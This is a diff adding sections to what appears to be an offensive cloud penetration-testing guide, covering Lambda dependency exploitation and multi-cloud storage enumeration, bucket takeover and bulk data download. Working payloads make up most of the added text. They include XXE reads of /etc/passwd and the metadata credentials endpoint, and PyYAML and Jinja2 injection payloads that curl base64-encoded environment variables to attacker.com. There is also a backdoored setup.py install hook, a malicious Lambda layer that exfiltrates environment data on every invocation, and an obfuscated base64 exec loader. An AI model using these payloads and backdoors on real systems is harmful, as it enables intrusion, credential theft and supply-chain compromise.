@@ -19420,8 +19420,736 @@ aws lambda get-function-configuration \
 # nodejs14.x - CVE-2022-32212, CVE-2022-32213, CVE-2022-32214
 # nodejs16.x - Various prototype pollution issues
 
-#
+# Scan for vulnerable npm packages
+npm audit --production --json | jq '.vulnerabilities | to_entries[] | select(.value.severity == "critical" or .value.severity == "high")'
+
+# Check for specific npm vulnerabilities
+npm ls ajv       # CVE-2020-15366 - Prototype pollution
+npm ls minimist  # CVE-2020-7598  - Prototype pollution
+npm ls lodash    # Multiple CVEs depending on version
+npm ls express   # CVE-2022-24999
+````
+
+#### Python Runtime Vulnerabilities
+```bash
+# Check Python runtime version
+aws lambda get-function-configuration \
+  --function-name FUNCTION_NAME \
+  --query 'Runtime' --output text
+
+# Known vulnerable runtimes:
+# python3.6 - EOL, multiple vulnerabilities
+# python3.7 - CVE-2021-3737, CVE-2021-4189
+# python3.8 - CVE-2022-0391
+
+# Check for vulnerable Python packages
+cat requirements.txt | grep -E "requests==|urllib3==|pyyaml==|django==|flask=="
+
+# Scan with bandit for security issues
+pip3 install bandit
+bandit -r function-code/ -f json -o bandit-report.json
+````
+
+#### Java/JVM Runtime Vulnerabilities
+
+```bash
+# Extract Java dependencies
+unzip function.zip
+find . -name "*.jar" | while read jar; do
+  echo "Analyzing $jar"
+  unzip -l "$jar" | grep -E "\.class$"
+done
+
+# Check for vulnerable Log4j versions
+find . -name "log4j-core-*.jar" -exec basename {} \; | \
+  grep -E "2\.(0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16)\."
+
+# Check for vulnerable Jackson versions (CVE-2020-36518)
+find . -name "jackson-databind-*.jar"
+
+# Check for vulnerable Spring Framework versions
+find . -name "spring-*.jar" | grep -E "spring-core|spring-beans"
 ```
+
+#### .NET Core Runtime Issues
+
+```bash
+# Check .NET runtime version
+az functionapp config show \
+  --name FUNCTION_APP \
+  --resource-group RESOURCE_GROUP \
+  --query "netFrameworkVersion"
+
+# Extract NuGet packages
+unzip function.zip
+cat *.csproj | grep "PackageReference" | grep -oP 'Include="\K[^"]*'
+
+# Known vulnerable packages:
+# System.Text.Encodings.Web < 6.0.0 - CVE-2021-26701
+# Microsoft.AspNetCore.* < 6.0.10 - Multiple CVEs
+# Newtonsoft.Json < 13.0.1 - CVE-2021-42043
+```
+
+### Exploiting Outdated Dependencies
+
+#### Vulnerable Request Libraries
+
+**Python `requests` + `urllib3` SSRF (CVE-2021-33503)**
+
+```python
+# [Inference] Vulnerable pattern - older urllib3 versions
+# Actual exploitation requires specific urllib3 version < 1.26.5
+
+def lambda_handler(event, context):
+    import requests
+    url = event['url']
+    # VULNERABLE: CRLF injection possible in older urllib3
+    response = requests.get(url)
+    return response.text
+```
+
+**Exploitation:**
+
+```bash
+# Attempt CRLF injection
+aws lambda invoke \
+  --function-name FUNCTION_NAME \
+  --payload '{"url":"http://example.com:80?a=1 HTTP/1.1\r\nHost: attacker.com\r\n\r\nGET /"}' \
+  response.json
+
+# [Unverified] Success depends on urllib3 version and Python version
+```
+
+#### XML External Entity (XXE) in XML Parsers
+
+**Python `lxml` XXE (CVE-2021-43818)**
+
+```python
+# Vulnerable function using lxml
+from lxml import etree
+
+def lambda_handler(event, context):
+    xml_data = event['xml']
+    # VULNERABLE: XXE if using vulnerable lxml version
+    parser = etree.XMLParser(resolve_entities=True)
+    doc = etree.fromstring(xml_data.encode(), parser)
+    return etree.tostring(doc)
+```
+
+**XXE Payload:**
+
+```bash
+# Exploit with XXE payload
+cat > xxe_payload.xml <<'EOF'
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+EOF
+
+# Base64 encode and send
+PAYLOAD=$(cat xxe_payload.xml | base64 -w0)
+aws lambda invoke \
+  --function-name FUNCTION_NAME \
+  --payload "{\"xml\":\"$PAYLOAD\"}" \
+  response.json
+
+# Attempt SSRF via XXE
+cat > xxe_ssrf.xml <<'EOF'
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+]>
+<root>&xxe;</root>
+EOF
+```
+
+**Disclaimer:** [Inference] Actual XXE exploitation depends on lxml configuration, parser settings, and Lambda execution environment restrictions.
+
+#### SQL Injection via ORM Vulnerabilities
+
+**SQLAlchemy < 1.4.17 (CVE-2021-23336)**
+
+```python
+# [Inference] Vulnerable pattern in older SQLAlchemy versions
+from sqlalchemy import create_engine, text
+
+def lambda_handler(event, context):
+    engine = create_engine(os.environ['DB_CONNECTION'])
+    user_input = event['query']
+    
+    # VULNERABLE: Parameter parsing issues in older versions
+    with engine.connect() as conn:
+        result = conn.execute(text(f"SELECT * FROM users WHERE name=:name"), 
+                             name=user_input)
+        return [dict(row) for row in result]
+```
+
+**Exploitation attempt:**
+
+```bash
+# Test for SQL injection
+aws lambda invoke \
+  --function-name FUNCTION_NAME \
+  --payload '{"query":"admin'\'' OR '\''1'\''='\''1"}' \
+  response.json
+
+# [Unverified] Success depends on SQLAlchemy version and database type
+```
+
+### Container Image-Based Function Vulnerabilities
+
+#### Scanning Lambda Container Images
+
+```bash
+# List Lambda functions using container images
+aws lambda list-functions \
+  --query 'Functions[?PackageType==`Image`].[FunctionName,CodeSize,PackageType]' \
+  --output table
+
+# Get image URI
+aws lambda get-function \
+  --function-name FUNCTION_NAME \
+  --query 'Code.ImageUri' \
+  --output text
+
+# Pull image (requires ECR access)
+IMAGE_URI=$(aws lambda get-function --function-name FUNCTION_NAME --query 'Code.ImageUri' --output text)
+aws ecr get-login-password --region us-east-1 | \
+  docker login --username AWS --password-stdin $IMAGE_URI
+
+docker pull $IMAGE_URI
+
+# Scan with Trivy
+trivy image $IMAGE_URI
+
+# Scan with Grype
+grype $IMAGE_URI -o json > vulnerabilities.json
+
+# Scan with Clair
+clairctl report $IMAGE_URI
+```
+
+#### Extracting Secrets from Container Images
+
+```bash
+# Pull and analyze layers
+docker pull $IMAGE_URI
+docker save $IMAGE_URI -o function-image.tar
+tar -xf function-image.tar
+
+# Search for secrets in layers
+find . -name "layer.tar" -exec tar -tf {} \; | grep -E "\.env|config|secret|key|credential"
+
+# Extract specific layer
+tar -xf <layer-hash>/layer.tar
+
+# Scan with trufflehog
+trufflehog filesystem . --json > secrets.json
+
+# Check environment variables in image
+docker inspect $IMAGE_URI | jq '.[0].Config.Env'
+```
+
+#### Base Image Vulnerabilities
+
+```bash
+# Identify base image
+docker history $IMAGE_URI --no-trunc
+
+# Common vulnerable base images:
+# - amazonlinux:1 (EOL)
+# - ubuntu:18.04 (numerous CVEs)
+# - node:10 (EOL)
+# - python:3.6 (EOL)
+
+# Check for specific base image CVEs
+docker inspect $IMAGE_URI | jq '.[0].Config.Image'
+# Then search CVE databases for that base image
+```
+
+### Dependency Lock File Exploitation
+
+#### Package Lock Manipulation
+
+**Python `requirements.txt` vs `Pipfile.lock`**
+
+```bash
+# Compare dependencies
+diff <(cat requirements.txt | cut -d'=' -f1 | sort) \
+     <(cat Pipfile.lock | jq -r '.default | keys[]' | sort)
+
+# Check for unpinned versions (dangerous)
+grep -v "==" requirements.txt
+
+# Verify package hashes
+pip-audit -r requirements.txt --require-hashes
+```
+
+**Node.js `package-lock.json` Integrity**
+
+```bash
+# Check for package-lock.json presence
+if [ ! -f "package-lock.json" ]; then
+  echo "[WARNING] No package-lock.json - versions not locked"
+fi
+
+# Verify integrity hashes
+npm ci  # Fails if package-lock.json doesn't match package.json
+
+# Check for suspicious package sources
+cat package-lock.json | jq '.dependencies | to_entries[] | select(.value.resolved | contains("http://"))'
+
+# Detect potential registry hijacking
+cat package-lock.json | jq -r '.dependencies[].resolved' | \
+  grep -v "https://registry.npmjs.org" | \
+  grep -v "https://registry.yarnpkg.com"
+```
+
+#### Dependency Version Confusion
+
+```bash
+# Check for version mismatches
+cat package.json | jq '.dependencies' > declared-deps.json
+cat package-lock.json | jq '.dependencies | with_entries(.value = .value.version)' > locked-deps.json
+
+# Compare
+diff <(jq -S . declared-deps.json) <(jq -S . locked-deps.json)
+
+# Find packages with "*", "^", or "~" version specifiers
+cat package.json | jq -r '.dependencies | to_entries[] | select(.value | test("[*^~]")) | .key'
+```
+
+### Live Exploitation Scenarios
+
+#### Scenario 1: Exploiting Vulnerable Image Processing Library
+
+```python
+# Vulnerable Lambda using Pillow < 8.3.2 (CVE-2021-34552)
+from PIL import Image
+import io
+import base64
+
+def lambda_handler(event, context):
+    # VULNERABLE: Buffer overflow in Pillow
+    image_data = base64.b64decode(event['image'])
+    img = Image.open(io.BytesIO(image_data))
+    img.thumbnail((100, 100))
+    
+    # Process image...
+    return {'status': 'processed'}
+```
+
+**Exploitation:**
+
+```bash
+# [Inference] Create malicious image (requires specific Pillow version)
+# Actual exploitation requires crafted image file - details omitted for safety
+
+# Test for vulnerability
+aws lambda invoke \
+  --function-name FUNCTION_NAME \
+  --payload '{"image":"'$(base64 -w0 < test-image.png)'"}' \
+  response.json
+
+# Monitor for crashes or errors
+aws logs tail /aws/lambda/FUNCTION_NAME --follow --filter-pattern "Error\|Segmentation fault"
+```
+
+**Disclaimer:** [Unverified] Actual buffer overflow exploitation in serverless environments is complex and depends on ASLR, system protections, and runtime configurations.
+
+#### Scenario 2: PyYAML Deserialization (CVE-2020-14343)
+
+```python
+# Vulnerable function using PyYAML < 5.4
+import yaml
+
+def lambda_handler(event, context):
+    config = event['config']
+    # VULNERABLE: Unsafe YAML load
+    data = yaml.load(config, Loader=yaml.Loader)
+    return data
+```
+
+**Exploitation:**
+
+```python
+# Create malicious YAML payload
+import yaml
+import base64
+
+malicious_yaml = """
+!!python/object/apply:os.system
+args: ['curl http://attacker.com/exfil?data=$(env|base64)']
+"""
+
+# Send to Lambda
+import boto3
+import json
+
+client = boto3.client('lambda')
+response = client.invoke(
+    FunctionName='FUNCTION_NAME',
+    Payload=json.dumps({'config': malicious_yaml})
+)
+```
+
+**Mitigation detection:**
+
+```python
+# Safe YAML loading
+data = yaml.safe_load(config)  # Only loads basic types
+```
+
+#### Scenario 3: Template Injection via Jinja2
+
+```python
+# Vulnerable Lambda using Jinja2
+from jinja2 import Template
+
+def lambda_handler(event, context):
+    template_string = event['template']
+    # VULNERABLE: Server-Side Template Injection
+    template = Template(template_string)
+    return template.render(name=event.get('name', 'World'))
+```
+
+**Exploitation:**
+
+```bash
+# SSTI payload to read environment variables
+PAYLOAD='{{ self.__init__.__globals__.__builtins__.__import__("os").environ }}'
+
+aws lambda invoke \
+  --function-name FUNCTION_NAME \
+  --payload "{\"template\":\"$PAYLOAD\"}" \
+  response.json
+
+# RCE payload
+PAYLOAD='{{ self.__init__.__globals__.__builtins__.__import__("os").popen("whoami").read() }}'
+
+# Exfiltrate data
+PAYLOAD='{{ self.__init__.__globals__.__builtins__.__import__("os").popen("curl http://attacker.com/exfil?data=$(env|base64)").read() }}'
+```
+
+### Automated Dependency Exploitation Tools
+
+#### Snyk Test and Exploit
+
+```bash
+# Install Snyk
+npm install -g snyk
+
+# Authenticate
+snyk auth
+
+# Test for vulnerabilities
+cd function-directory
+snyk test --json > snyk-results.json
+
+# Filter for exploitable vulnerabilities
+cat snyk-results.json | jq '.vulnerabilities[] | select(.exploit != null or .malicious == true)'
+
+# Get remediation advice
+snyk test --json | jq -r '.vulnerabilities[] | "\(.title): \(.fixedIn)"'
+
+# Monitor function dependencies
+snyk monitor
+```
+
+#### OSV Scanner
+
+```bash
+# Install osv-scanner
+go install github.com/google/osv-scanner/cmd/osv-scanner@latest
+
+# Scan directory
+osv-scanner --lockfile=package-lock.json
+
+# Scan with SBOM
+osv-scanner --sbom=sbom.json
+
+# Output JSON for parsing
+osv-scanner --lockfile=requirements.txt --format=json > osv-results.json
+```
+
+#### Retire.js (Node.js specific)
+
+```bash
+# Install retire.js
+npm install -g retire
+
+# Scan Node.js dependencies
+retire --path ./function-code --outputformat json --outputpath retire-results.json
+
+# Check for specific vulnerabilities
+retire --path ./function-code | grep -A 5 "Severity: high\|Severity: critical"
+```
+
+### Exploitation via Transitive Dependencies
+
+#### Discovering Hidden Dependencies
+
+```bash
+# Python - show full dependency tree
+pip3 install pipdeptree
+pipdeptree -p package-name
+
+# Find vulnerable transitive dependencies
+pipdeptree --warn silence | grep -B 5 -A 5 "vulnerable-package"
+
+# Node.js - show dependency tree
+npm ls
+
+# Show only production dependencies
+npm ls --production --depth=10
+
+# Find specific vulnerable package in tree
+npm ls vulnerable-package
+```
+
+#### Exploiting Indirect Dependencies
+
+```bash
+# Example: Application uses package A, which depends on vulnerable package B
+# Check if vulnerable package is actually loaded
+
+# For Python - trace imports at runtime
+python3 -c "import sys; import package_a; print('\n'.join(sys.modules.keys()))" | grep vulnerable_package
+
+# For Node.js - check require cache
+node -e "require('package-a'); console.log(Object.keys(require.cache).filter(k => k.includes('vulnerable-package')))"
+
+# If vulnerable package is loaded, craft exploit targeting it through main package
+```
+
+### Defense Evasion in Dependency Attacks
+
+#### Obfuscating Malicious Code in Dependencies
+
+```python
+# [Inference] Example of obfuscated malicious code that might evade scanning
+# This is for detection purposes only
+
+import base64
+exec(base64.b64decode(b'aW1wb3J0IG9zO29zLnN5c3RlbSgiY3VybCBodHRwOi8vYXR0YWNrZXIuY29tIik='))
+
+# Encrypted payload
+import cryptography.fernet
+key = b'stored_elsewhere'
+f = cryptography.fernet.Fernet(key)
+exec(f.decrypt(b'encrypted_payload'))
+
+# Dynamic import
+__import__('os').__dict__['sy'+'stem']('malicious command')
+```
+
+#### Detecting Obfuscated Code
+
+```bash
+# Search for base64 decode patterns
+grep -r "base64.b64decode\|base64.decodebytes" function-code/
+
+# Search for exec/eval usage
+grep -r "exec(\|eval(" function-code/
+
+# Search for dynamic imports
+grep -r "__import__\|importlib.import_module" function-code/
+
+# Use AST analysis
+python3 -c "
+import ast
+import sys
+
+with open('suspicious_file.py', 'r') as f:
+    tree = ast.parse(f.read())
+    
+for node in ast.walk(tree):
+    if isinstance(node, (ast.Exec, ast.Eval)):
+        print(f'Found exec/eval at line {node.lineno}')
+    elif isinstance(node, ast.Call):
+        if hasattr(node.func, 'id') and node.func.id == '__import__':
+            print(f'Found dynamic import at line {node.lineno}')
+"
+```
+
+### Real-Time Dependency Monitoring
+
+#### Webhook-Based Vulnerability Alerts
+
+```bash
+# Set up GitHub Dependabot alerts
+# Configure in repository settings
+
+# Query GitHub Security API for vulnerabilities
+curl -H "Authorization: token GITHUB_TOKEN" \
+  "https://api.github.com/repos/OWNER/REPO/vulnerability-alerts"
+
+# Snyk webhook integration
+curl -X POST "https://api.snyk.io/v1/org/ORG_ID/webhooks" \
+  -H "Authorization: token SNYK_TOKEN" \
+  -d '{"url":"https://your-webhook-endpoint.com","events":["new-vulnerability"]}'
+```
+
+#### Continuous Scanning in CI/CD
+
+```yaml
+# Example GitHub Actions workflow
+name: Dependency Security Scan
+on: [push, pull_request]
+
+jobs:
+  security:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      
+      - name: Run Trivy
+        uses: aquasecurity/trivy-action@master
+        with:
+          scan-type: 'fs'
+          scan-ref: '.'
+          format: 'sarif'
+          output: 'trivy-results.sarif'
+          
+      - name: Run Snyk
+        uses: snyk/actions/node@master
+        env:
+          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+        with:
+          args: --severity-threshold=high
+```
+
+---
+
+## Advanced Exploitation Techniques
+
+### Chaining Vulnerabilities
+
+#### Cold Start + Dependency Vulnerability Chain
+
+```bash
+# Scenario: Exploit vulnerable dependency during cold start initialization
+
+# 1. Force cold start
+sleep 900  # Wait for function to go cold
+
+# 2. Trigger function with payload that exploits vulnerable init code
+aws lambda invoke \
+  --function-name FUNCTION_NAME \
+  --payload '{"trigger":"exploit"}' \
+  response.json
+
+# 3. Vulnerable initialization code executes with payload
+# Example: YAML deserialization during config loading in global scope
+```
+
+#### Event Injection + SSRF + Metadata Service
+
+```bash
+# Complete attack chain for AWS Lambda
+
+# 1. Inject malicious S3 event
+aws s3 cp exploit-file.txt s3://trigger-bucket/
+
+# 2. Function processes file, vulnerable code triggers SSRF
+# Vulnerable function code:
+# url = f"http://{bucket}.s3.amazonaws.com/{key}"
+# requests.get(url)
+
+# 3. Exploit: filename contains SSRF payload
+touch "169.254.169.254/latest/meta-data/iam/security-credentials/lambda-role"
+aws s3 cp "169.254.169.254/latest/meta-data/iam/security-credentials/lambda-role" s3://trigger-bucket/
+
+# 4. Function makes request to metadata service, leaks credentials
+```
+
+### Persistence Mechanisms
+
+#### Backdoored Dependency Installation
+
+```bash
+# Upload malicious package to private package repository
+
+# 1. Create backdoored package
+mkdir malicious-package
+cd malicious-package
+
+cat > setup.py <<'EOF'
+from setuptools import setup
+from setuptools.command.install import install
+import os
+
+class PostInstallCommand(install):
+    def run(self):
+        install.run(self)
+        # Backdoor: runs on every cold start
+        os.system('curl http://attacker.com/beacon?function=$AWS_LAMBDA_FUNCTION_NAME')
+
+setup(
+    name='legitimate-package-name',
+    version='1.0.1',  # Higher than legitimate version
+    cmdclass={'install': PostInstallCommand},
+)
+EOF
+
+# 2. Upload to private PyPI/repository
+# 3. Function installs backdoored version on next deployment
+```
+
+#### Layer-Based Persistence
+
+```bash
+# Create malicious Lambda layer
+
+mkdir python
+cat > python/backdoor.py <<'EOF'
+import atexit
+import os
+
+def exfiltrate():
+    os.system('curl http://attacker.com/exfil?env=$(env|base64)')
+
+# Runs on every invocation
+atexit.register(exfiltrate)
+EOF
+
+# Package layer
+zip -r layer.zip python/
+
+# Publish layer (requires permissions)
+aws lambda publish-layer-version \
+  --layer-name malicious-layer \
+  --zip-file fileb://layer.zip \
+  --compatible-runtimes python3.9
+
+# Attach to target function (requires permissions)
+aws lambda update-function-configuration \
+  --function-name TARGET_FUNCTION \
+  --layers arn:aws:lambda:us-east-1:ACCOUNT:layer:malicious-layer:1
+```
+
+**Key Serverless Security Tools:**
+
+- **Pacu** - AWS exploitation framework
+- **ScoutSuite** - Multi-cloud security auditing
+- **Trivy** - Comprehensive vulnerability scanner
+- **Snyk** - Dependency vulnerability management
+- **Safety/pip-audit** - Python security scanning
+- **npm audit** - Node.js security scanning
+- **OWASP Dependency-Check** - Multi-language scanning
+- **OSV Scanner** - Open-source vulnerability scanner
+- **Retire.js** - JavaScript library vulnerability scanner
+
+**Important Related Topics:**
+
+- **Serverless Application Repository (SAR) exploitation** - Malicious application deployment
+- **Step Functions state machine manipulation** - Workflow injection attacks
+- **EventBridge rule hijacking** - Event routing manipulation
+- **Secrets Manager/Parameter Store extraction** - Credential harvesting from serverless apps
+- **VPC Lambda security** - ENI exploitation and network pivoting
+- **Container escape in Lambda** - Breaking out of execution environment (rare but theoretical)
 
 ---
 
@@ -23734,10 +24462,10339 @@ companybackup
 
 # Test existence
 for name in companyname companystorage companyprod companydev; do
-  response=$(curl -s -o /
+  response=$(curl -s -o /dev/null -w "%{http_code}" "https://$name.blob.core.windows.net/")
+  if [ "$response" != "404" ]; then
+    echo "[+] Storage account exists: $name"
+  fi
+done
 ```
 
+**Service SAS vs Account SAS** [Inference - Account SAS provides broader access]
 
+```bash
+# Account SAS (ss=bfqt) grants access to multiple services:
+# b=blob, f=file, q=queue, t=table
+
+# If you find Account SAS with multiple services:
+sas="sv=2020-08-04&ss=bfqt&srt=sco&sp=rwdlac&se=2025-12-31T23:59:59Z&sig=..."
+
+# Access blob storage
+curl "https://account.blob.core.windows.net/container?restype=container&comp=list&$sas"
+
+# Access file storage
+curl "https://account.file.core.windows.net/?comp=list&$sas"
+
+# Access table storage
+curl "https://account.table.core.windows.net/Tables?$sas"
+
+# Access queue storage
+curl "https://account.queue.core.windows.net/?comp=list&$sas"
+```
+
+**Azure Storage Analytics Logs**
+
+```bash
+# Storage analytics logs are stored in $logs container
+# If accessible:
+
+az storage blob list \
+  --account-name targetcompany \
+  --container-name '$logs' \
+  --output table
+
+# Download logs
+az storage blob download-batch \
+  --source '$logs' \
+  --destination ./azure-logs \
+  --account-name targetcompany
+
+# Log format (semicolon-delimited):
+# version;request-start-time;operation-type;request-status;http-status-code;...
+
+# Parse for IP addresses and operations
+cat azure-logs/*.log | awk -F';' '{print $10, $3}' | sort -u
+# Shows client IPs and operations
+
+# Find authentication failures
+grep "AnonymousAuthenticationFailure\|SASAuthenticationFailure" azure-logs/*.log
+```
+
+### Google Cloud Storage Account Enumeration
+
+**Project and Bucket Enumeration**
+
+```bash
+# GCS buckets belong to projects
+# Project ID format: lowercase letters, numbers, hyphens
+
+# If you have credentials:
+gcloud projects list
+
+# List all buckets in project
+gsutil ls -p project-id
+
+# Get bucket metadata
+gsutil ls -L -b gs://bucket-name
+
+# Output includes:
+# - Project number
+# - Project ID
+# - Storage class
+# - Location
+# - IAM configuration
+```
+
+**Public Bucket Reconnaissance**
+
+```bash
+# Get bucket metadata without auth (if bucket is public)
+curl "https://storage.googleapis.com/storage/v1/b/target-bucket"
+
+# Response includes project number:
+{
+  "kind": "storage#bucket",
+  "id": "target-bucket",
+  "name": "target-bucket",
+  "projectNumber": "123456789012",
+  "location": "US",
+  "storageClass": "STANDARD"
+}
+
+# Use project number to identify organization
+curl "https://cloudresourcemanager.googleapis.com/v1/projects/project-id"
+
+# Enumerate other buckets in same project (requires auth)
+curl -H "Authorization: Bearer $TOKEN" \
+  "https://storage.googleapis.com/storage/v1/b?project=project-id"
+```
+
+**GCS Access Logs Analysis**
+
+```bash
+# Enable logging (logs stored in separate bucket)
+gsutil logging set on -b gs://logs-bucket gs://target-bucket
+
+# If you access log bucket:
+gsutil ls gs://logs-bucket
+
+# Download logs
+gsutil -m cp -r gs://logs-bucket/target-bucket_usage_* ./gcs-logs/
+
+# Log format (CSV):
+# time_micros,c_ip,c_ip_type,c_ip_region,cs_method,cs_uri,sc_status,cs_bytes,sc_bytes,time_taken_micros,cs_host,cs_referer,cs_user_agent,s_request_id,cs_operation,cs_bucket,cs_object
+
+# Parse for operations and IPs
+cat gcs-logs/*.csv | awk -F',' '{print $2, $15}' | sort -u
+# Shows IPs and operations (GET_Object, PUT_Object, etc.)
+
+# Find authentication details
+cat gcs-logs/*.csv | grep -v "Anonymous" | awk -F',' '{print $20}' | sort -u
+# Shows authenticated principals
+```
+
+### Cross-Cloud Storage Account Correlation
+
+**Identifying Related Accounts Across Providers**
+
+```bash
+# Common naming patterns across cloud providers:
+# AWS S3: company-data
+# Azure: companydata
+# GCS: company-data
+
+# Search for similar names
+aws_buckets="company-data company-backup company-prod"
+azure_accounts="companydata companybackup companyprod"
+gcs_buckets="company-data company-backup company-prod"
+
+# Test all platforms
+for name in $aws_buckets; do
+  test_s3_bucket "$name"
+done
+
+for name in $azure_accounts; do
+  test_azure_storage "$name"
+done
+
+for name in $gcs_buckets; do
+  test_gcs_bucket "$name"
+done
+```
+
+**Metadata-Based Correlation**
+
+```bash
+# Compare metadata fields for organizational links
+
+# AWS S3 tags
+aws s3api get-bucket-tagging --bucket target-bucket
+
+# Azure storage tags
+az storage account show \
+  --name targetcompany \
+  --query tags
+
+# GCS labels
+gsutil label get gs://target-bucket
+
+# Look for common identifiers:
+# - Department names
+# - Cost center codes
+# - Environment tags (prod, dev, staging)
+# - Owner email addresses
+```
+
+### Advanced Enumeration Techniques
+
+**DNS and Certificate Enumeration**
+
+```bash
+# Find storage-related subdomains
+subfinder -d target.com | grep -E "s3|blob|storage|bucket|cdn"
+amass enum -d target.com | grep -E "s3|blob|storage"
+
+# Certificate transparency logs
+curl -s "https://crt.sh/?q=%.target.com&output=json" | \
+  jq -r '.[].name_value' | \
+  grep -E "s3|blob|storage|bucket" | \
+  sort -u
+
+# DNS zone transfer attempts (rarely successful)
+dig axfr @ns1.target.com target.com | grep -E "s3|blob|storage"
+```
+
+**Application Source Code Analysis**
+
+```bash
+# GitHub repository enumeration
+# Look for storage configuration in code
+
+# AWS SDK configuration
+grep -r "aws-sdk\|boto3\|AWS.S3" . --include="*.py" --include="*.js" --include="*.java"
+
+# Azure SDK
+grep -r "azure-storage\|@azure/storage-blob" . --include="*.py" --include="*.js" --include="*.cs"
+
+# GCS SDK
+grep -r "google-cloud-storage\|@google-cloud/storage" . --include="*.py" --include="*.js"
+
+# Extract bucket/account names from code
+grep -rh "s3.amazonaws.com\|blob.core.windows.net\|storage.googleapis.com" . | \
+  grep -oP '[\w-]+\.s3\.amazonaws\.com|[\w]+\.blob\.core\.windows\.net|[\w-]+\.storage\.googleapis\.com' | \
+  sort -u
+```
+
+**Mobile Application Analysis**
+
+```bash
+# Decompile Android APK
+apktool d target-app.apk -o app-decompiled
+
+# Search for storage URLs
+grep -r "s3.amazonaws.com\|blob.core.windows.net\|storage.googleapis.com" app-decompiled/
+
+# Extract from strings.xml
+cat app-decompiled/res/values/strings.xml | grep -E "s3|blob|storage|bucket"
+
+# iOS IPA analysis
+unzip target-app.ipa
+strings Payload/Target.app/Target | grep -E "s3|blob|storage|bucket"
+
+# Search for API keys and SAS tokens
+grep -r "AKIA\|SharedAccessSignature" app-decompiled/
+```
+
+**Web Application Traffic Analysis**
+
+```bash
+# Burp Suite: Proxy → HTTP History → Filter
+# Search for: s3.amazonaws.com, blob.core.windows.net, storage.googleapis.com
+
+# Export all storage-related requests
+# Look for patterns in URLs, headers, parameters
+
+# Extract SAS tokens from requests
+grep -E "sig=|Signature=" burp-export.txt | \
+  grep -oP 'sig=[^&\s]+|Signature=[^&\s]+' | \
+  sort -u
+
+# Extract pre-signed URLs
+grep -E "AWSAccessKeyId=|X-Goog-Signature=" burp-export.txt
+
+# Identify upload endpoints
+grep -E "PUT|POST" burp-export.txt | \
+  grep -E "s3.amazonaws.com|blob.core.windows.net|storage.googleapis.com"
+```
+
+### Storage Bucket Takeover Scenarios
+
+**Dangling DNS Record Exploitation**
+
+```bash
+# Scenario: DNS points to deleted S3 bucket
+
+# Identify potential takeover
+host static.target.com
+# Returns: static.target.com is an alias for old-bucket.s3.amazonaws.com
+
+# Test if bucket exists
+aws s3 ls s3://old-bucket --no-sign-request
+# Error: NoSuchBucket
+
+# Register the bucket name
+aws s3 mb s3://old-bucket --region us-east-1
+
+# Upload content
+echo "<h1>Proof of Concept</h1>" > index.html
+aws s3 cp index.html s3://old-bucket/ --acl public-read
+
+# Configure static website
+aws s3 website s3://old-bucket --index-document index.html
+
+# Verify takeover
+curl http://static.target.com
+# Should display your content
+```
+
+**Azure Storage Account Takeover** [Unverified - Azure prevents reuse of deleted storage account names for 30 days]
+
+```bash
+# Scenario: CNAME points to deleted storage account
+
+# Check DNS
+host cdn.target.com
+# Returns: cdn.target.com is an alias for oldaccount.blob.core.windows.net
+
+# Test if account exists
+curl https://oldaccount.blob.core.windows.net/
+# Response: 404 (account doesn't exist)
+
+# Attempt to create storage account with same name
+az storage account create \
+  --name oldaccount \
+  --resource-group myresourcegroup \
+  --location eastus \
+  --sku Standard_LRS
+
+# If successful (after 30-day wait period):
+# Upload content to container
+# Configure to serve content
+```
+
+**GCS Bucket Takeover**
+
+```bash
+# Scenario: CNAME points to deleted GCS bucket
+
+# Check DNS
+host assets.target.com
+# Returns: assets.target.com is an alias for c.storage.googleapis.com
+# Additional CNAME: old-bucket.storage.googleapis.com
+
+# Test if bucket exists
+gsutil ls gs://old-bucket
+# Error: BucketNotFoundException
+
+# Create bucket with same name
+gsutil mb gs://old-bucket
+
+# Upload content
+echo "Takeover PoC" > index.html
+gsutil cp index.html gs://old-bucket/
+gsutil iam ch allUsers:objectViewer gs://old-bucket
+
+# Verify takeover
+curl http://assets.target.com/index.html
+```
+
+### Automated Enumeration Frameworks
+
+**CloudMapper (AWS)**
+
+```bash
+# Collect AWS account data
+git clone https://github.com/duo-labs/cloudmapper.git
+cd cloudmapper
+
+# Configure
+python3 cloudmapper.py configure add-account --config-file config.json \
+  --name target-account \
+  --id 123456789012 \
+  --default true
+
+# Collect data
+python3 cloudmapper.py collect --account target-account
+
+# Find public S3 buckets
+python3 cloudmapper.py find_public_resources --account target-account
+
+# Generate report
+python3 cloudmapper.py report --account target-account
+```
+
+**ScoutSuite (Multi-Cloud)**
+
+```bash
+# AWS enumeration
+python3 scout.py aws --profile target-profile
+
+# Azure enumeration
+python3 scout.py azure --cli
+
+# GCP enumeration
+python3 scout.py gcp --project-id target-project
+
+# Results include:
+# - Public storage resources
+# - Misconfigured ACLs
+# - Overly permissive policies
+# - Encryption status
+
+# View report
+firefox scoutsuite-report/scoutsuite-results/*.html
+```
+
+**Prowler (AWS Security Assessment)**
+
+```bash
+# Run Prowler
+prowler aws --profile target-profile
+
+# Specific S3 checks
+prowler aws --profile target-profile --services s3
+
+# Check for public buckets
+prowler aws --profile target-profile --checks s3_bucket_public_access
+
+# Check for unencrypted buckets
+prowler aws --profile target-profile --checks s3_bucket_encryption
+
+# Export results
+prowler aws --profile target-profile --output-formats json,html
+```
+
+**Pacu (AWS Exploitation Framework)**
+
+```bash
+# Start Pacu
+python3 pacu.py
+
+# Create session
+set_keys
+# Enter AWS keys
+
+# Enumerate S3 buckets
+run s3__enum
+
+# Download S3 data
+run s3__download_bucket --bucket target-bucket
+
+# Check for public buckets
+run s3__bucket_finder --wordlist bucket-names.txt
+
+# Privilege escalation via S3
+run iam__privesc_scan
+```
+
+### Data Exfiltration via Storage
+
+**Large-Scale Download Strategies**
+
+```bash
+# AWS S3 parallel download
+aws s3 sync s3://target-bucket ./exfil-data --no-sign-request
+
+# With rate limiting (stealth)
+aws s3 sync s3://target-bucket ./exfil-data \
+  --no-sign-request \
+  --request-payer requester \
+  --cli-read-timeout 300
+
+# Azure parallel download
+az storage blob download-batch \
+  --source container-name \
+  --destination ./exfil-data \
+  --account-name targetcompany \
+  --max-connections 4
+
+# GCS parallel download
+gsutil -m cp -r gs://target-bucket ./exfil-data
+
